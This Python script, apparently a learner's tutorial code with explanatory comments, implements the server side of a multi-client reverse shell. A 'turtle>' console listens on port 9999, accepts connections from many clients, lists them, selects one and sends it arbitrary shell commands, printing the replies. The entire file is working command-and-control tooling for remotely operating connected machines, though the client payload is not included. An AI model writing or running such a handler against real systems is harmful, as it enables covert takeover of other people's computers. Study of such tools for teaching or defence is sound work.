# -*- coding: utf-8 -*-
"""
Created on Sun Mar 15 16:39:39 2020

@author: kv83821
"""

import socket
import sys
import threading
import time
from queue import Queue
NUMBER_OF_THREADS = 2 #One thread listens for new clients and other handles already connected clients
JOB_NUMBER = [1, 2]
queue = Queue()
all_conn = []
all_address = []
def create_socket():
    try:
        global host
        global port
        global s #socket
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error "+str(msg))
        
        
        
def bind_socket():
    try:
        global host
        global port
        global s #socket
        
        s.bind((host,port))  #(()) are for tuples 
        s.listen(5) #nomber inside listen is no. of max connections it can have
    
    except socket.error as msg:
        print("Socket creation error "+str(msg)+" retrying...")
        bind_socket() #recursively call in case of error
        
#Code for accepting multiple connections
def accepting_multiple():
    for c in all_conn:
        c.close()
    del all_conn[:]
    del all_address[:]
    
    #Now accept the connections in the new server
    
    while True:
        conn,address = s.accept()
        s.setblocking(1) # To prevent timeout of idle connections
        
        all_conn.append(conn)
        all_address.append(address)
        
        print("Connection established with: "+address[0])

#create a custom shell with 1.display all clients 2.Select a client 3.Send command to a client

def start_shell():
    
    while True:
        cmd = input('turtle>')    
        if cmd=='list':
            list_connections() #is a functions to display all active clients
            
        elif 'select' in cmd:
            conn = get_target(cmd) #get the client and return the connection object
            if conn is not None:
                send_target_commands(conn) #if conn is active send commands to it
        else:
            print("Command not found kindly check")


def list_connections():
    
    results = ''
    
    for i,conn in enumerate(all_conn): # enumerate kepps on increasing i from 0.
        try:
            conn.send(str.encode(" "))
            conn.recv(204800)
        except:
            del all_conn[i]
            del all_address[i]
            continue
        results += str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
        
    print("------Active Clients------"+"\n"+results)


def get_target(cmd):
    
    target = cmd.replace('select ','')
    target = int(target)
    conn = all_conn[target]
    print("You are now connected to "+str(all_address[target][0]))
    print(str(all_address[target][0])+">", end = '') # to show that we are now working a client not the turtle
    
    return conn

def send_target_commands(conn):
    while True:
        # We use while loop so that we can send multiple commands
        try:
            cmd_prompt_input = input()
            if cmd_prompt_input == 'quit':
                break
            if len(str.encode(cmd_prompt_input)) > 0:
                conn.send(str.encode(cmd_prompt_input))
                client_response = str(conn.recv(204800),"utf-8")
                #here 1024 is the max chunk length and utf-8 is the format that can be converted to string
                print(client_response , end='')
                #end is used so that it goes to a new line
        except:
            break

# Now apply the concept of thread
#thread 1 for new clients
#thread 2 for already connected clients

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target = work)
        t.daemon = True # end thread with ending job
        t.start()
        
        
# defining the work of the threads
def work():
    while True:
        
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_multiple()
        if x == 2:
            start_shell()
    
        queue.task_done()

def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join() #Blocks until all items in the queue have been gotten and processed.

# When you call queue.join() in the main thread, all it does is block the main threads 
# until the workers have processed everything that's in the queue. It does not stop the
# worker threads, which continue executing their infinite loops.
            

create_workers()
create_job()
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    